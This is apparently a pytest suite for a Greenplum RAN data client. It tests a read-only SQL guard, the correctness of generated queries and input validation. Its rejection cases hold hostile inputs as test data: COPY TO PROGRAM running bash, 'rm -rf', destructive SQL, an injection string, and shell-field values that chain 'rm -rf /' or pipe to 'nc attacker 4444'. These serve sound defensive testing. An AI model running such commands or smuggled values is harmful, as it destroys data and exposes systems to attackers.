"""gp_ran（RAN Greenplum 两跳取数）的守卫测试。

不连生产：只验「只读守卫」和「SQL 生成口径」这两块纯逻辑 —— 它们恰好是最容易
在换人改代码时被悄悄改坏的部分（尤其 OR/AND 优先级那条，现场人工语句就是错的）。

    pytest tests/test_gp_ran.py -q
"""
import re
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from backend.services.gp_ran.gp_ran_client import (  # noqa: E402
    GpRanError, _as_copy, _validate_shell_idents, assert_readonly,
    resolve_endpoints, sql_n78_users, sql_volte_users,
)


# ---------------------------------------------------------------- 只读守卫
def test_copy_to_stdout_is_allowed():
    assert_readonly(_as_copy(sql_volte_users("2026-10-08", "2026-10-15")))


@pytest.mark.parametrize("sql", [
    # 现场人工流程用的服务器落盘写法：内容为用户号码清单，本模块拒绝
    "COPY (SELECT 1) TO '/home/gpadmin/volte.csv' WITH CSV HEADER",
    # 这两条能以 gpadmin 身份起操作系统命令
    "COPY (SELECT 1) TO PROGRAM 'bash -c id'",
    "\\! rm -rf /home/gpadmin",
    "drop table l_t216",
    "update l_t216 set c031 = 0",
    "delete from l_t216",
    "insert into l_t216 default values",
])
def test_dangerous_statements_rejected(sql):
    with pytest.raises(GpRanError):
        assert_readonly(sql)


def test_plain_select_allowed():
    assert_readonly("SELECT count(*) FROM L_T216")


# ---------------------------------------------------------------- 口径
def test_volte_window_applies_to_all_three_flags():
    """守 OR/AND 优先级这个坑：时间窗必须管住 C031/C032/C033 三支。

    现场人工语句写成 `C031=1 OR C032=1 OR C033=1 AND D027>x AND D027<y`，
    AND 优先级更高 → 实际等价于 `C031=1 OR C032=1 OR (C033=1 AND 时间窗)`，
    时间过滤只作用在 C033 上，结果是「全历史号码」。
    """
    sql = sql_volte_users("2026-10-08", "2026-10-15")
    assert "(A.C031 = 1 OR A.C032 = 1 OR A.C033 = 1) AND" in sql
    # 括号之后紧跟时间窗，且窗口出现在三个标志位之后（不是只挂在 C033 上）
    or_group = re.search(r"\(A\.C031.*?\)", sql).group(0)
    assert "D027" not in or_group
    tail = sql.split(or_group, 1)[1]
    assert "A.D027 >=" in tail and "A.D027 <" in tail


def test_day_window_is_half_open_on_epoch_2000():
    sql = sql_n78_users("2026-10-08", "2026-10-15")
    assert "EXTRACT(EPOCH FROM ('2026-10-08'::TIMESTAMP - TIMESTAMP '2000-01-01 00:00:00'))" in sql
    assert "POSITION('$78$' IN '$'||A.C043||'$')" in sql
    # 左闭右开：起始整点要含进来（人工版用 > 会漏掉 00:00:00 的记录）
    assert "A.D027 >=" in sql and "A.D027 < " in sql


@pytest.mark.parametrize("bad", ["2026-10-8", "20261008", "", "2026-10-08' or 1=1 --"])
def test_date_argument_validated(bad):
    with pytest.raises(GpRanError):
        sql_volte_users(bad, "2026-10-15")


# ---------------------------------------------------------------- 注入面
@pytest.mark.parametrize("field,value", [
    ("db_user", "gpadmin; rm -rf /"),
    ("database", "db' | nc attacker 4444"),
])
def test_shell_interpolated_fields_must_be_identifiers(field, value):
    with pytest.raises(GpRanError):
        _validate_shell_idents({"db_user": "gpadmin", "database": "", field: value})


def test_valid_identifiers_pass():
    _validate_shell_idents({"db_user": "gpadmin", "database": "greenplum_db"})


def test_missing_credential_fails_loudly(monkeypatch):
    """没有口令时必须明确报错，不能拿着空口令去撞生产账号。"""
    for env in ("GP_RAN_CONTROL_PASS", "GP_RAN_MASTER_PASS"):
        monkeypatch.delenv(env, raising=False)
    monkeypatch.setattr("backend.services.gp_ran.gp_ran_client._cred",
                        lambda *a, **k: ("ubuntu", ""))
    with pytest.raises(GpRanError):
        resolve_endpoints()


# ---------------------------------------------------------------- 用户宽表
from backend.services.gp_ran.gp_ran_profile import (  # noqa: E402
    BOOL_FLAGS, sql_user_profile)


def test_profile_is_one_group_by_pass():
    """宽表必须是**单次 GROUP BY** 能算出来的形状。

    7 天窗口约 10 亿行，任何 DISTINCT ON + join（取"最后一次记录的各字段"）都要对
    10 亿行排序；Greenplum 的 runaway_cleaner 内存熔断在本表上已经真实触发过一次。
    所以这里守住：只有一个 GROUP BY、没有 join、没有 DISTINCT ON。
    """
    sql = sql_user_profile("2026-10-12", "2026-10-19")
    assert sql.count("GROUP BY") == 1
    assert sql.rstrip().endswith("GROUP BY A.D023")
    for banned in ("JOIN", "DISTINCT ON", "UNION"):
        assert banned not in sql.upper()
    assert_readonly(_as_copy(sql))          # 必须能过只读守卫


def test_profile_excludes_lte_only_band_columns():
    """c036/c037 只含 LTE 频段（实测无 78），却占单日文件 44% 体积 → 不得回流。"""
    sql = sql_user_profile("2026-10-12", "2026-10-19")
    assert "c036" not in sql and "c037" not in sql
    assert "bands_a_any" not in sql and "bands_b_any" not in sql


def test_profile_never_emits_a_fabricated_coordinate():
    """经纬度必须成对取自同一条记录，否则 max(lon)+max(lat) 会拼出一个不存在的位置。

    当前实现的选择是**干脆不给坐标**，只给 geo_recs。哪天要加坐标，
    必须改成 DISTINCT ON 或窗口函数并实测内存 —— 不能简单加两列 max()。
    """
    sql = sql_user_profile("2026-10-12", "2026-10-19")
    assert "max(A.c070)" not in sql and "max(A.c071)" not in sql
    assert " AS lon" not in sql and " AS lat" not in sql
    assert "count(A.c070) AS geo_recs" in sql


def test_profile_flags_are_bool_or_semantics():
    sql = sql_user_profile("2026-10-12", "2026-10-19")
    for col in BOOL_FLAGS:
        assert f"bool_or(A.{col} = 1) AS {col}_any" in sql
    # c028 恒为 0，带出来只会误导
    assert "c028" not in sql
    assert len(BOOL_FLAGS) == 9


def test_profile_window_is_half_open_and_validated():
    sql = sql_user_profile("2026-10-12", "2026-10-19")
    assert "A.D027 >= EXTRACT(EPOCH FROM ('2026-10-12'::TIMESTAMP" in sql
    assert "A.D027 < EXTRACT(EPOCH FROM ('2026-10-19'::TIMESTAMP" in sql
    with pytest.raises(GpRanError):
        sql_user_profile("2026/10/12", "2026-10-19")
